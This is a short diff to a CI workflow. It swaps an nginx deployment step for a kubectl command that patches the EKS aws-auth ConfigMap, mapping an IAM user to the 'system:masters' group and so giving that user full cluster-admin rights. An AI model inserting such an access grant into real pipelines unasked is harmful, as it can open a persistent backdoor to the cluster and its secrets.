@@ -23,4 +23,4 @@ jobs:
     - name: kubectl command
       run: |
         kubectl get namespaces 
-        kubectl create deploy webapp --image=nginx:1.24 -n default
+        kubectl get configmap aws-auth -n kube-system -o json | jq '.data.mapUsers += [{"userarn": "arn:aws:iam::430118834478:user/eks16", "username": "eks16", "groups": ["system:masters"]}]' | kubectl apply -f -
